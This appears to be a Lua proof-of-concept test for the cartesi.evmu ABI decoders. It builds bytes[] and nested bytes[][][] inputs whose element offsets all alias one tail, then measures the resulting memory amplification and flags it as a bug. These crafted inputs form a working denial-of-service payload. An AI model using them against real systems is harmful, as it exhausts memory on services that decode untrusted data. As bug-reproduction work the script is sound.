-- Proof: aliased element offsets in ABI arrays of dynamic types make cartesi.evmu decoders
-- allocate memory proportional to (#elements x tail length), i.e. quadratic in input size,
-- and exponential with nesting depth.
local evmu = require("cartesi.evmu")

local function word(n) return string.rep("\0", 24) .. string.pack(">I8", n) end

-- Build abi.encode((bytes[])) where all N elements alias the same L-byte tail.
local function build_flat(N, L)
    local parts = {}
    parts[#parts + 1] = word(32) -- tuple offset of bytes[] component
    parts[#parts + 1] = word(N) -- array length
    for _ = 1, N do parts[#parts + 1] = word(N * 32) end -- all offsets -> same tail
    parts[#parts + 1] = word(L)
    parts[#parts + 1] = string.rep("A", L)
    return table.concat(parts)
end

-- Build abi.encode((bytes[][]...)) of depth D where every level has N aliased offsets
local function build_nested(D, N, L)
    -- innermost: bytes element at relative position
    -- level layout: [len N][N offsets all = N*32][child]
    local child = word(L) .. string.rep("B", L)
    for _ = 1, D do
        local parts = { word(N) }
        for _ = 1, N do parts[#parts + 1] = word(N * 32) end
        parts[#parts + 1] = child
        child = table.concat(parts)
    end
    return word(32) .. child
end

local function measure(spec, data, prefer)
    collectgarbage("collect")
    local before = collectgarbage("count") * 1024
    local t0 = os.clock()
    local v = evmu.decode_abi(spec, data, prefer)
    local dt = os.clock() - t0
    collectgarbage("collect")
    local after = collectgarbage("count") * 1024
    local retained = after - before
    return v, retained, dt
end

local bug = false

-- Flat case: N=2000 elements, L=64 KiB tail -> input ~128 KiB
do
    local N, L = 2000, 64 * 1024
    local data = build_flat(N, L)
    local v, retained, dt = measure("(bytes[])", data, "raw")
    assert(#v[1] == N and #v[1][1] == L)
    local ratio = retained / #data
    print(string.format("flat (bytes[]): input=%d bytes, retained Lua memory=%.1f MiB, ratio=%.0fx, time=%.2fs",
        #data, retained / 2 ^ 20, ratio, dt))
    if ratio > 64 then
        bug = true
        print(string.format("BUG: decode_abi('(bytes[])') of %d-byte input retains %.1f MiB (%.0fx amplification) " ..
            "because all %d element offsets alias one %d-byte tail", #data, retained / 2 ^ 20, ratio, N, L))
    end
    v = nil
end

-- Same via decode_calldata (pre-existing API, present on main)
do
    local N, L = 2000, 64 * 1024
    local data = build_flat(N, L)
    local sel = select(2, evmu.parse_func_sig("f(bytes[])"))
    local calldata = sel .. data
    collectgarbage("collect")
    local before = collectgarbage("count") * 1024
    local v = evmu.decode_calldata("f(bytes[])", calldata, "raw")
    collectgarbage("collect")
    local retained = collectgarbage("count") * 1024 - before
    print(string.format("decode_calldata f(bytes[]): input=%d, retained=%.1f MiB (%.0fx)", #calldata,
        retained / 2 ^ 20, retained / #calldata))
    if retained / #calldata > 64 then
        bug = true
        print("BUG: decode_calldata('f(bytes[])') has the same aliased-offset amplification")
    end
    v = nil
end

-- Nested case: bytes[][][] depth 3, N=16 per level, L=16 KiB -> 4096 copies
do
    local D, N, L = 3, 16, 16 * 1024
    local data = build_nested(D, N, L)
    local v, retained, dt = measure("(bytes[][][])", data, "raw")
    print(string.format("nested (bytes[][][]): input=%d bytes, retained=%.1f MiB, ratio=%.0fx, time=%.2fs",
        #data, retained / 2 ^ 20, retained / #data, dt))
    assert(#v[1][1][1][1] == L)
    if retained / #data > 64 then
        bug = true
        print(string.format("BUG: nested decode_abi('(bytes[][][])') of %d-byte input retains %.1f MiB " ..
            "(%d^%d aliased copies)", #data, retained / 2 ^ 20, N, D))
    end
end

os.exit(bug and 1 or 0)
